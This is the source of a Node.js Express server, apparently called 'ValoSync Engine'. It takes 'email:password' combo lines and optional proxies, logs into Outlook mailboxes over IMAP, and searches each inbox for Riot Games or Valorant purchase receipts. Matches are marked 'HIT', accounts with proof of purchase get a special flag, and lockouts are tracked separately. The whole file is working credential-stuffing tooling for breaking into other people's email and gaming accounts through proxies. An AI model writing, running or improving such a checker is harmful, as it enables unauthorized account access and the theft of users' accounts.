const express = require('express');
const { ImapFlow } = require('imapflow');
const { simpleParser } = require('mailparser');
const { HttpsProxyAgent } = require('https-proxy-agent');
const app = express();

app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

async function checkMail(email, password, proxyStr) {
    let agent = null;
    if (proxyStr) {
        agent = new HttpsProxyAgent(proxyStr.startsWith('http') ? proxyStr : `http://${proxyStr}`);
    }

    const client = new ImapFlow({
        host: "outlook.office365.com",
        port: 993,
        secure: true,
        auth: { user: email, pass: password },
        logger: false,
        ...(agent && { tls: { agent } })
    });

    try {
        await client.connect();
        let lock = await client.getMailboxLock('INBOX');
        let result = { status: 'INVALID', count: 0, isSultan: false, body: "" };

        try {
            let messages = await client.search({
                or: [
                    { header: { field: 'from', value: 'Riot Games' } },
                    { body: 'Valorant' },
                    { body: 'Purchase Receipt' },
                    { body: 'Order Confirmed' }
                ]
            });

            if (messages.length > 0) {
                result.status = 'HIT';
                result.count = messages.length;
                let lastMsg = await client.fetchOne(messages[messages.length - 1], { source: true });
                let parsed = await simpleParser(lastMsg.source);
                result.body = parsed.text || "No readable content found.";
                result.isSultan = /Purchase|Order|Receipt|Success|Payment/i.test(result.body);
            } else {
                result.status = 'NO_DATA';
            }
        } finally {
            lock.release();
        }
        await client.logout();
        return result;
    } catch (err) {
        const msg = err.message.toLowerCase();
        if (msg.includes('aup') || msg.includes('locked') || msg.includes('challenge')) return { status: 'LOCKED' };
        return { status: 'INVALID' };
    }
}

app.post('/api/check', async (req, res) => {
    const { combo, proxy } = req.body;
    const [email, pass] = combo.split(':');
    if (!email || !pass) return res.json({ status: 'ERROR' });
    const data = await checkMail(email.trim(), pass.trim(), proxy);
    res.json({ ...data, combo });
});

const PORT = process.env.PORT || 7860;
app.listen(PORT, () => console.log(`ValoSync Engine Active on Port ${PORT}`));
